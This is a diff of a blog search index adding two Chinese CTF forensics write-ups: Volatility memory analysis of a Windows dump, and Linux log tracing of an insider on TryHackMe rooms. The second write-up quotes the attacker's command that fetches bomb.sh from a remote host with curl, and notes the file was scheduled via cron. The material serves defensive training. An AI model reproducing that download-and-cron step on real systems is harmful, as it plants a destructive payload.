@@ -4,6 +4,68 @@
   
     
     <entry>
+      <title>打靶记录(七七)之THMForensics</title>
+      <link href="/2023/12/21/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%B8%83)%E4%B9%8BTHMForensics/"/>
+      <url>/2023/12/21/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%B8%83)%E4%B9%8BTHMForensics/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Volatility-forensics"><a href="#Volatility-forensics" class="headerlink" title="Volatility forensics"></a>Volatility forensics</h1><p>这个转储文件的操作系统是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/home/mikannse/桌面/victim.raw)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800028420a0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80002843d00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2019-05-02 18:11:45 UTC+0000</span><br><span class="line">     Image local date and time : 2019-05-02 11:11:45 -0700</span><br></pre></td></tr></tbody></table></figure><p>windows</p><p>SearchIndexer的PID是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw --profile=Win7SP1x64 pstree |grep SearchIndexer</span><br></pre></td></tr></tbody></table></figure><p>2180</p><p>用户最后访问的目录是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw --profile=Win7SP1x64 shellbags</span><br></pre></td></tr></tbody></table></figure><p>shellbags插件用于分析Windows系统中的Shellbags信息。Shellbags是Windows操作系统中的一种机制，用于追踪和维护Windows资源管理器中文件夹的访问历史。每当用户打开或访问文件夹时，Shellbags会记录相关信息，例如文件夹的路径、文件夹的显示设置等</p><p>根据access data 看最迟的时间:deleted_files</p><h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p>有许多可疑的开放端口;它是哪一个？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw --profile=Win7SP1x64 netscan</span><br></pre></td></tr></tbody></table></figure><p>UDP:5005</p><p>Vads标记和执行保护是恶意进程的强指标;您能找到它们是什么吗？</p><p>在Windows内核内存管理中，VAD（Virtual Address Descriptor）表示虚拟地址空间中的一段区域，它描述了进程的虚拟地址空间的布局和属性。VADs 包含了诸如内存分配、保护属性等信息。</p><p><strong>Vads Tag：</strong> 在Windows内核中，VADs可以被标记为不同的类型，以表示其在虚拟地址空间中的不同用途。这个标记被称为 “Vads Tag”。Vads Tag 可能表示 VAD 的类型，例如表示保留区域、用户模式栈、内核模式栈、执行代码等。Vads Tag 的使用有助于内核对虚拟地址空间进行分类和管理。</p><p><strong>Execute Protection（执行保护）：</strong> 表示VAD中的内存区域是否被标记为可执行（executable）。执行保护是一种内存保护机制，它控制是否允许在该区域执行代码。如果一个VAD的 Execute Protection 被设置为允许执行，那么该区域可能包含可执行代码，例如程序的指令或者动态链接库（DLL）中的代码。如果执行保护被设置为禁止执行，那么该区域可能用于存储数据，而不允许在其中执行代码。</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw --profile=Win7SP1x64 malfind</span><br></pre></td></tr></tbody></table></figure><p>malfind插件用于查找和分析内存中的恶意代码或者不正常的内存模式</p><p>1860;1820;2464</p><h1 id="IOC-SAGA"><a href="#IOC-SAGA" class="headerlink" title="IOC SAGA"></a>IOC SAGA</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw --profile=Win7SP1x64 memdump -p 1860,1820,2464 -D ~/桌面</span><br></pre></td></tr></tbody></table></figure><p>将进程的内存转储</p><p>‘<a href="http://www.go.ru/">www.go.ru</a>‘ </p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">strings 1820.dmp 1860.dmp 2464.dmp|grep "www\.go....\.ru"</span><br></pre></td></tr></tbody></table></figure><p><a href="http://www.goporn.ru/">www.goporn.ru</a></p><p>‘<a href="http://www.i****.com/">www.i****.com</a>‘</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">strings 1820.dmp 1860.dmp 2464.dmp|grep 'www\.i....\.com'</span><br></pre></td></tr></tbody></table></figure><p><a href="http://www.ikaka.com/">www.ikaka.com</a></p><p>‘<a href="http://www.ic/*/*/*/*/*/*.com">www.ic\*\*\*\*\*\*.com</a>‘</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">strings 1820.dmp 1860.dmp 2464.dmp|grep 'www\.ic......\.com'</span><br></pre></td></tr></tbody></table></figure><p><a href="http://www.icsalabs.com/">www.icsalabs.com</a></p><p>202.***.233.*** (Write full IP)</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">strings 1820.dmp 1860.dmp 2464.dmp|grep '202\....\.233\....'</span><br></pre></td></tr></tbody></table></figure><p>202.107.233.211</p><p>***.200.**.164(Write full IP)</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">strings 1820.dmp 1860.dmp 2464.dmp|grep '...\.200\....164'</span><br></pre></td></tr></tbody></table></figure><p>209.200.12.164</p><p>209.190.***.***</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">strings 1820.dmp 1860.dmp 2464.dmp|grep '209\.190\....\....'</span><br></pre></td></tr></tbody></table></figure><p>209.190.122.186</p><p>PID 2464的唯一环境变量是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python2 vol.py -f ~/桌面/victim.raw --profile=Win7SP1x64 -p 2464 envars</span><br></pre></td></tr></tbody></table></figure><p>OANOCACHE</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>volatility牛B。不过关于windows进程的知识还需要补</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+            <tag> 溯源取证 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>打靶记录(七六)之THMDisgruntled</title>
+      <link href="/2023/12/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E5%85%AD)%E4%B9%8BTHMDisgruntled/"/>
+      <url>/2023/12/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E5%85%AD)%E4%B9%8BTHMDisgruntled/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p>用户使用提升的权限在计算机上安装了软件包。根据日志，完整的命令是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /var/log/auth.log  |grep install</span><br></pre></td></tr></tbody></table></figure><p>COMMAND=/usr/bin/apt install dokuwiki</p><p>运行上一个命令时，当前工作目录（PWD）是什么？</p><p>/home/cybert</p><h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p>在安装上一个任务中的程序包后创建了哪个用户？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /var/log/auth.log  |grep useradd</span><br></pre></td></tr></tbody></table></figure><p>it-admin</p><p>一个用户后来被赋予了sudo特权。sudoers文件是什么时候更新的？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /var/log/auth.log  |grep visudo</span><br></pre></td></tr></tbody></table></figure><p>Dec 28 06:27:34</p><p>使用“vi”文本编辑器打开脚本文件。这个文件的名称是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /var/log/auth.log  |grep vi</span><br></pre></td></tr></tbody></table></figure><p>bomb.sh</p><h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p>创建文件时使用的命令是什么 bomb.sh</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /home/it-admin/.bash</span><br></pre></td></tr></tbody></table></figure><p>curl 10.10.158.38:8080/bomb.sh –output bomb.sh</p><p>文件已重命名并移动到其他目录。现在这个文件的完整路径是什么？</p><p>发现删除bomb.sh之后编辑了crontab</p><p>/bin/os-update.sh</p><p>上一个问题中的文件最后一次修改是什么时候？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ls -liah /bin/os-update.sh</span><br></pre></td></tr></tbody></table></figure><p>不知道为什么没有显示具体时间，总之是Dec 28 06:29</p><p>执行第一个问题中的文件时将创建的文件的名称是什么？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /bin/os-update.sh</span><br></pre></td></tr></tbody></table></figure><p>goodbye.txt</p><h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p>恶意文件会在什么时候触发？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></tbody></table></figure><p>08:00 AM</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>easy</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+            <tag> 溯源取证 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>打靶记录(七五)之THMMemoryForensics</title>
       <link href="/2023/12/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%BA%94)%E4%B9%8BTHMMemoryForensics/"/>
       <url>/2023/12/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%BA%94)%E4%B9%8BTHMMemoryForensics/</url>
@@ -53,8 +115,6 @@
             
             <tag> 网安 </tag>
             
-            <tag> 渗透测试 </tag>
-            
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
@@ -85,8 +145,6 @@
         <tags>
             
             <tag> 网安 </tag>
-            
-            <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
@@ -119,8 +177,6 @@
             
             <tag> 网安 </tag>
             
-            <tag> 渗透测试 </tag>
-            
             <tag> 打靶 </tag>
             
             <tag> linux </tag>
@@ -151,8 +207,6 @@
         <tags>
             
             <tag> 网安 </tag>
-            
-            <tag> 渗透测试 </tag>
             
             <tag> 打靶 </tag>
             
